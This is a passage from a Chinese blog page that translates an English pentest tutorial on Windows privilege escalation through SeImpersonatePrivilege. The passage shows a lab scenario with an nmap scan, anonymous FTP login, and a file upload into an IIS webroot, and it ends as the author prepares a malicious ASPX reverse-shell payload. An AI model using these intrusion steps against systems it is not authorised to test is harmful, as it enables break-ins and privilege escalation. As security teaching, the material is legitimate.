<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 提权-SeImpersonatePrivilege 特权 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 提权-SeImpersonatePrivilege 特权 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 SeImpersonatePrivilege – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 SeImpersonatePrivilege – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.799afac8.js" defer="defer"></script>
<script src="/web/assets/js/main.73484f69.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="展开侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="折叠侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL">Windows 提权-MSSQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare">Windows 提权-PrintNightmare</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs">Windows 提权-RunAs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权">Windows 提权-SeBackupPrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权">Windows 提权-SeImpersonatePrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过">Windows 提权-UAC 绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-不安全的 GUI 程序">Windows 提权-不安全的 GUI 程序</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_1">Windows 提权-内核利用_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_2">Windows 提权-内核利用_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-密码搜寻">Windows 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-手工枚举">Windows 提权-手工枚举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持">Windows 提权-服务_DLL 劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限">Windows 提权-服务_弱文件_目录权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限">Windows 提权-服务_弱服务权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限">Windows 提权-服务_弱注册表权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径">Windows 提权-服务_未引用的服务路径</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/windows-提权"><span itemprop="name">Windows 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Windows 提权-SeImpersonatePrivilege 特权</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 提权-SeImpersonatePrivilege 特权</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/seimpersonateprivilege/" target="_blank" rel="noopener noreferrer">SeImpersonatePrivilege – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 获得立足点</a>
<ul>
<li><a href="#id1.1">1.1 枚举 SeimpersonatePrivilege 特权是否启用</a></li>
</ul>
</li>
<li><a href="#id2">2 使用 JuicyPotato 模拟本地 SYSTEM 帐户</a>
<ul>
<li><a href="#id2.1">2.1 滥用 SeimpersonatePrivilege 特权：JuciyPotato.exe</a></li>
<li><a href="#id2.2">2.2 JuicyPotato 故障处理</a></li>
<li><a href="#id2.3">2.3 滥用 SeimpersonatePrivilege 特权：Metasploit 模块</a></li>
</ul>
</li>
<li><a href="#id3">3 使用 PrintSpoofer 模拟本地 SYSTEM 帐户</a>
<ul>
<li><a href="#id3.1">3.1 滥用 SeimpersonatePrivilege 特权：PrintSpoofer.exe</a></li>
<li><a href="#id3.2">3.2 PrintSpoofer 故障处理</a></li>
</ul>
</li>
<li><a href="#id4">4 使用 RoguePotato 模拟本地 SYSTEM 帐户</a>
<ul>
<li><a href="#id4.1">4.1 滥用 SeimpersonatePrivilege 特权：RoguePotato.exe</a></li>
<li><a href="#id4.2">4.2 RoguePotato 故障处理</a></li>
</ul>
</li>
<li><a href="#id5">5 最后的想法</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将探讨三种能够用来滥用 SeImpersonate 特权的技术。首先，我们将回顾这样一个场景：在利用配置有误的 FTP 服务器后，我们能以 iisapppool 服务账号在 Windows 10 机器上站稳脚跟。接着，我们会枚举这个账号的权限，发现它已启用 SeImpersonatePrivilege 特权，然后我们会借助 JuicyPotato.exe 执行 Potato 攻击，把我们的权限提升到本地 SYSTEM 级别。 【同时，也会利用 Metasploit 里的 JuicyPotato 模块来自动化这种攻击操作。】</p>
<p>最后，我们也来看看怎样通过另外两款工具 RoguePotato 和 PrintSpoofer 去滥用 SeImpersonate 特权，从而在 Server 2019 的机器上获取到 SYSTEM 权限。</p>
<p>默认情况下，本地管理员组的成员以及任何本地服务帐户都将被授予“身份验证后模拟客户端”用户权利，即 SeimpersonatePrivilege 特权。</p>
<blockquote>
<p>授权位置：本地安全策略(secpol.msc)-本地策略-用户权限分配-身份验证后模拟客户端。】</p>
</blockquote>
<p>一个已启用 SeImpersonate 特权的账户在完成身份验证后，就能够模拟其它也已通过身份验证的账户，如账户A。如果被模拟的账户A 没有完成身份验证，那么系统中（LSASS 进程里的登录会话）便不会存留它的令牌信息，此时便不能够满足 SeImpersonate 特权模拟账户身份的条件，此时模拟账户身份的动作也会失败，系统也会拒绝模拟请求。</p>
<blockquote>
<p>账户登录或通过身份验证之后，系统便会为其生成一个身份验证令牌，该令牌会一直存在，直到系统重启。</p>
</blockquote>
<p>了解了这种特权能让我们做什么之后，作为攻击者，我们得思考：“当 SeImperonsate 特权启用时，要冒充管理员账户还需要哪些条件？”</p>
<p>让我们找出答案！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1获得立足点"><strong><div id="id1">1、获得立足点</div></strong><a href="#1获得立足点" class="hash-link" aria-label="1获得立足点的直接链接" title="1获得立足点的直接链接">​</a></h2>
<p>为了给这篇文章补充些背景信息，我们会拿一个有关配置有误的 FTP 服务器作为示例场景。我们要借助这种错误配置来构建一个利用链，从而能从 Web 服务器获取反向 shell ，这样一来，就能以内置的 IIS 服务账户：iisapppool 作为立足点。</p>
<p>运行以下 nmap 扫描，我们可以观察到 FTP 在端口 21 上打开并且允许匿名访问、端口 80 上有一个 IIS Web 服务器。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -A -sV -sC -T4 172.16.1.50 -p- -oN tcp.nmap</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451051-281502391-e0f61cd74b4dca83d53c4c0193d850cf.png" width="715" height="651" class="img_ev3q"></p>
<p>查看这个 nmap 扫描结果，我们发现 FTP 服务器里的文件貌似属于 Web 服务器，这表明 FTP 服务器很可能运行在 Web 服务的根目录上！</p>
<p>这时，我们应该做的第一件事就是尝试匿名登录 FTP 服务器，并测试是否拥有文件上传权限。如果我们可以在 FTP 服务器中上传文件，那么我们很可能轻而易举就能获得反向 Shell。</p>
<p>在登录 FTP 服务器之前，我们先制作一个简单的 txt 文件。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;testing for hax!&#x27; &gt; test.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在已经准备好了，我们可以连接到 FTP 服务器并使用凭证 <strong>anonymous : anonymous</strong> 登录。【注：匿名用户的密码可以是任何值或者直接回车。】</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ftp 172.16.1.50</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160449487-2130026353-7fa571d3baf4eff74cf4c555ec02486f.png" width="583" height="188" class="img_ev3q"></p>
<p>成功登录并建立会话后，我们可以使用 put 命令将我们的 test.txt 文件上传到 FTP 服务器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451155-1500129122-982d7ac493d39a6ce911ee71adceadce.png" width="1013" height="364" class="img_ev3q"></p>
<p>Awesome！我们能够将文件上传到 FTP 服务器，并且可以从浏览器访问到文件内容。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160450166-492022260-4de90e29c3048a3fa5f58aadb54e5e08.png" width="515" height="145" class="img_ev3q"></p>
<p>现在我们可以行动了！既然我们已经能够确认 FTP 服务器在 webroot 上运行，那我们就能够继续上传恶意文件，然后执行它，从而在这台主机上获取反向 shell。</p>
<p>鉴于我们正在面对的 IIS 10.0 是现代化版本，所以我们用于漏洞利用所需创建的文件类型选择 ASPX。</p>
<blockquote>
<p>对于 IIS 的较旧版本（IIS 6之前的版本），我们将选择 ASP 类型的利用文件。</p>
</blockquote>
<p>为了制作恶意的 ASPX 文件，我们将使用 msfvenom 工具进行。</p>
<blockquote>
<p>从 nmap 扫描结果来看，目标运行着 IIS 10 ，被认定为 Windows 10 build 17134 。不过，这可能并非百分之百准确，但起码让我们知道了目标的大致情况；关键的是，这表明该系统较为现代，很可能是 x64 架构。鉴于此，我们首先制作基于 x64 位架构的恶意 ASPX 利用文件，要是不行，我们再测试 x32 位架构的恶意 ASPX 利用文件。</p>
</blockquote>
